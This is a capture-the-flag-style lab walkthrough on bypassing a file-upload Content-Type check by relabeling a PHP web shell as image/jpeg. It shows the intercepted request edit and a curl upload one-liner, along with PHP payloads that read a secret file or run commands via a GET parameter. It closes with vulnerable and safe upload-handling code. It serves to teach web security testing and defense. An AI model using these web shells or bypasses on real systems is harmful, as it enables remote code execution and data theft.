# File Upload Vulnerabilities - Lab #2: Web Shell Upload via Content-Type Restriction Bypass

**YouTube Tutorial:** [File Upload Vulnerabilities - Lab #2 Web shell upload via Content-Type restriction bypass](https://youtu.be/MR16GlyPI8k?si=ZfOBLeNr5V4TuQ2O)

---

## 1. What is a Content-Type Restriction Bypass?

### Core Concept

This lab looks exactly like Lab #1 at first glance — same avatar upload feature, same target file, same goal. But if you upload the identical `shell.php` from last time, it gets rejected. The server has added a check: it looks at the `Content-Type` header your browser sends along with the uploaded file, and if that header doesn't say something like `image/jpeg` or `image/png`, the upload is refused.

The problem is *where* that value comes from. The `Content-Type` header on a file upload isn't something the server inspects the file to determine — it's just a label your own browser (or, in Burp, you yourself) attaches to the upload request. It's a claim, not a fact. The server is trusting the attacker to honestly declare what kind of file they're sending, which is exactly the kind of check that doesn't survive contact with someone using Burp Repeater.

```
┌─────────────────────────────┐        ┌─────────────────────────────┐
│   FIRST ATTEMPT (BLOCKED)    │        │   BYPASS (ACCEPTED)          │
├─────────────────────────────┤        ├─────────────────────────────┤
│ Upload shell.php             │        │ Same shell.php file,         │
│ Content-Type:                │        │ same PHP code inside         │
│   application/x-php          │        │                               │
│ (browser's honest guess      │        │ Content-Type manually        │
│  based on the extension)     │        │ changed to: image/jpeg       │
└───────────────┬─────────────┘        └───────────────┬─────────────┘
                │                                       │
                ▼                                       ▼
┌─────────────────────────────┐        ┌─────────────────────────────┐
│ Server checks the header,    │        │ Server checks the header,    │
│ sees "php", REJECTS the      │        │ sees "jpeg", ACCEPTS it —    │
│ upload                       │        │ never looked at the actual   │
│                               │        │ file content at all          │
└─────────────────────────────┘        └───────────────┬─────────────┘
                                                         │
                                                         ▼
                                        ┌─────────────────────────────┐
                                        │ File stored with its real    │
                                        │ .php extension and real      │
                                        │ PHP code, fully intact       │
                                        │ = Remote Code Execution ✅   │
                                        └─────────────────────────────┘
```

The oracle here is the same as Lab #1's — the file extension still determines whether the server later executes the file as code — but this time there's a second, equally weak layer sitting in front of it: a header the server never verifies against the file's real content.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this. To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`.

* **Provided Credentials:** `wiener:peter`
* **Vulnerable Feature:** The same avatar upload option under "My account" as Lab #1, now with a `Content-Type` check added.
* **What Changed From Lab #1:** Simply uploading `shell.php` directly (as in Lab #1) now fails, since the browser automatically labels a `.php` file's upload with a `Content-Type` like `application/x-php`, which the server's new check rejects.
* **End Goal:** Same as Lab #1 — get a working PHP web shell uploaded and reachable, use it to read `/home/carlos/secret`, and submit the contents.

### Root Cause & Impact

The root cause is trusting a piece of client-supplied metadata — the `Content-Type` header — as if it were a reliable statement of fact about a file's actual content. Nothing about this header is verified against the bytes actually being uploaded; it's simply copied from whatever the client chose to send. Any check built entirely on attacker-controlled request metadata (headers, form field values, filenames) rather than the file's real, inspected content is trivial to bypass with a tool like Burp Repeater, which lets you freely edit any part of an intercepted request before it's sent.

---

## 3. Attack Methods & Techniques (What I Tried, and What Actually Worked)

**First move — just reuse Lab #1's shell.** Logging in as `wiener`, going to "My account," and uploading the exact same `shell.php` file from the previous lab. This time it doesn't go through — the app shows an error along the lines of the file type not being allowed.

**Figuring out what's actually being checked.** With Burp Proxy intercepting, uploading the file again and looking closely at the intercepted `POST /my-account/avatar` request shows the multipart form body includes a `Content-Type: application/x-php` line right above the actual PHP code, inside the part describing the uploaded file. That's clearly where the browser is being honest about what kind of file this is — and honesty is exactly what's getting the upload blocked.

**The obvious next step.** If the server is checking that specific line and rejecting anything that doesn't look like an image, the fix is just to lie in that line instead. Changing `Content-Type: application/x-php` to `Content-Type: image/jpeg` (leaving the actual PHP code, the filename, and everything else in the request completely untouched) and forwarding the request through Repeater.

**It just works.** The upload succeeds. The server apparently never re-examines the file's real bytes at all — it only cared about that one header matching an expected value, and once it did, the file was written to disk with its real `.php` extension and real PHP payload completely intact.

### Server Behavior

* **Uploading `shell.php` with its natural, browser-assigned `Content-Type: application/x-php`:** Rejected — the server's filter catches this and refuses to store the file.
* **Uploading the identical file, only with the `Content-Type` header manually changed to `image/jpeg` (or `image/png`):** Accepted without complaint — same filename, same extension, same malicious PHP content, only the header claim was different.
* **Requesting the uploaded file's URL directly:** Executes exactly as in Lab #1, since the file itself was never actually altered — only the label attached to it during transit.

---

## 4. Step-by-Step Walkthrough

### Step 1: Confirm the Naive Upload Now Fails

1. Log in with `wiener:peter` and go to **"My account."**
2. Create (or reuse from Lab #1) a file named `shell.php` containing:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. Attempt to upload it via the avatar field, exactly as before.
4. **Observation:** The upload is rejected, with the application indicating this file type isn't allowed — confirming a new check has been added since Lab #1.

### Step 2: Intercept the Upload Request in Burp

1. Turn on Burp Proxy interception (**Proxy → Intercept → Intercept is on**).
2. Attempt the upload again through the browser.
3. In Burp's intercepted request, locate the `POST /my-account/avatar` request. Within its multipart body, find the section describing your uploaded file — it will look something like:

```http
------WebKitFormBoundary...
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary...
```

4. Note the `Content-Type: application/x-php` line specifically — this is the value the browser automatically assigned based on the file's extension, and it's the value the server is checking.

### Step 3: Modify the Content-Type Header and Forward

1. With the request still held in Burp's Proxy (or after sending it to Repeater for easier editing), change this line:

```
Content-Type: application/x-php
```

to:

```
Content-Type: image/jpeg
```

2. Leave everything else in the request completely unchanged — the filename stays `shell.php`, and the actual PHP code inside the file's content stays exactly as written.
3. Forward (or send, if using Repeater) the modified request.
4. **Result:** The response indicates success — the file has been accepted and stored, with the server apparently satisfied by the `Content-Type` label alone.

### Step 4: Find the Uploaded File's URL

1. In your browser, reload the **"My account"** page.
2. The avatar image will likely appear broken (since the "image" is actually PHP source code, not real image data) — right-click the broken avatar and select **"Open image in new tab"** (or inspect the page source / check Burp's HTTP history) to get its direct URL, typically something like:

```
https://[LAB-ID].web-security-academy.net/files/avatars/shell.php
```

### Step 5: Trigger Execution and Retrieve the Secret

1. Navigate directly to that URL in your browser, or send a `GET` request to it via Burp Repeater.
2. **Result:** The response body contains the contents of `/home/carlos/secret`, confirming the PHP code executed on the server exactly as in Lab #1.

### Step 6: Submit the Solution

1. Copy the secret string from the response.
2. Click the lab banner's **"Submit solution"** button, paste the secret, and submit.
3. The lab banner updates to **"Congratulations, you solved the lab!"**.

---

## 5. Different Ways to Exploit This (Alternative Methods & Payloads)

**Other MIME types worth trying if `image/jpeg` doesn't satisfy a particular filter:**

```
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/webp
```

Different applications may whitelist different subsets of image MIME types — if one doesn't work, cycling through the common ones is a quick, low-effort next step.

**Using Burp Intruder to automate MIME-type fuzzing, instead of guessing one at a time:**

Send the upload request to Intruder, mark the `Content-Type` value as the payload position, and load a wordlist of common MIME types (`image/jpeg`, `image/png`, `image/gif`, `image/bmp`, `image/svg+xml`, etc.) as a **Simple list** payload. This is useful in real assessments where you don't know in advance which specific MIME type(s) the server's allow-list accepts.

**Combining this with a general-purpose shell instead of the single-file-read payload**, exactly as covered in Lab #1's alternative methods section:

```php
<?php system($_GET['command']); ?>
```

Upload this with the same `Content-Type: image/jpeg` trick, then interact with it via `?command=` the same way as before — useful if you expect to need more than one command during the same engagement.

**Checking whether the filename extension itself is also validated, separately from Content-Type:** try renaming the file to something like `shell.php.jpg` or `shell.jpg.php` while testing — some applications only check the Content-Type header and never look at the extension at all (as in this lab), while others check both, requiring a combined bypass.

**Using `curl` to construct and send the bypass request directly, without needing Burp at all:**

```bash
curl -X POST https://[LAB-ID].web-security-academy.net/my-account/avatar \
  -H "Cookie: session=[SESSION-VALUE]" \
  -F "csrf=[CSRF-TOKEN]" \
  -F "avatar=@shell.php;type=image/jpeg"
```

The `;type=image/jpeg` part of curl's `-F` flag explicitly overrides the Content-Type curl would otherwise auto-detect from the file extension — a handy one-liner alternative to manually editing requests in a proxy tool.

---

## 6. If This Existed in the Real World

Trusting the `Content-Type` header for file validation is an extremely common real-world mistake, precisely because it's the "quick fix" a developer reaches for after realizing extension-only checks (like Lab #1's complete absence of checks) aren't enough:

* **Numerous CVEs across CMS and web frameworks** have been filed specifically for "MIME type validation bypass" in file upload handlers — it's common enough to be considered its own well-known subcategory of file upload vulnerabilities, distinct from extension blacklisting bypasses.
* **API-based upload endpoints in SaaS products** frequently accept a `Content-Type` field as part of a JSON or multipart request body without any server-side content inspection — attackers targeting cloud storage or document-management APIs regularly test exactly this bypass as a first step, since it requires no special tooling beyond a proxy or `curl`.
* **Third-party upload widgets** embedded in websites (contact forms, support ticket attachments, resume submissions) often outsource "file type validation" to client-side JavaScript checking `file.type` — a property that, just like the HTTP header, is entirely derived from what the browser reports and is trivially spoofable by anyone bypassing the JavaScript entirely and crafting the raw request.

---

## 7. Pro-Tips & Common Pitfalls

* **Don't assume a rejected upload means the vulnerability is gone — it usually just means the *check* changed.** Lab #1 taught "just upload a `.php` file." This lab teaches the broader lesson: whenever an upload gets blocked, the very next question should be "what exactly is the server looking at to make that decision, and is that thing something I control?"
* **Multipart form data has more than one place metadata can hide.** The `Content-Type` line inside the file's own form-data section (as exploited here) is distinct from the overall request's top-level `Content-Type: multipart/form-data; boundary=...` header — make sure you're editing the right one, which is the one immediately preceding your file's raw content in the request body.
* **Only the label changed — the actual bytes on disk are identical to Lab #1's payload.** This is worth internalizing as the core lesson: a Content-Type check, on its own, provides zero actual security. It only filters out upload clients that are being truthful, which no real attacker ever is.
* **The vulnerable backend pattern:**

```php
// ❌ VULNERABLE — trusts the client-supplied Content-Type header entirely,
// never inspects the actual uploaded file's real content
$allowedTypes = ['image/jpeg', 'image/png'];
if (!in_array($_FILES['avatar']['type'], $allowedTypes)) {
    die('Invalid file type');
}
move_uploaded_file($_FILES['avatar']['tmp_name'], $targetPath); // still saved with original .php extension

// ✅ SAFE — verify the file's actual content (e.g. real image structure,
// magic bytes) server-side, and never trust the Content-Type header alone
if (!getimagesize($_FILES['avatar']['tmp_name'])) { // fails for non-image files
    die('Invalid file type');
}
$safeFilename = generateRandomFilename() . '.jpg'; // ignore original name/extension entirely
move_uploaded_file($_FILES['avatar']['tmp_name'], "/var/uploads/" . $safeFilename);
```

* **Prevention summary:**
  * Never trust the `Content-Type` header, the uploaded filename, or any other client-supplied metadata as the basis for a security decision — all of it is attacker-controlled and can be set to any value in a crafted request.
  * Validate file type by inspecting the actual file content server-side (checking for genuine image structure, valid magic bytes, or using a dedicated, well-tested file-type detection library).
  * Combine content validation with the same storage-location and filename-randomization protections covered in Lab #1 — a Content-Type check is not a substitute for those measures, only (at best) one additional, weak layer.
  * Treat any single-layer validation check as insufficient by default; real defense against file upload vulnerabilities requires several independent layers (content inspection, safe storage location, execution permissions, filename handling) working together.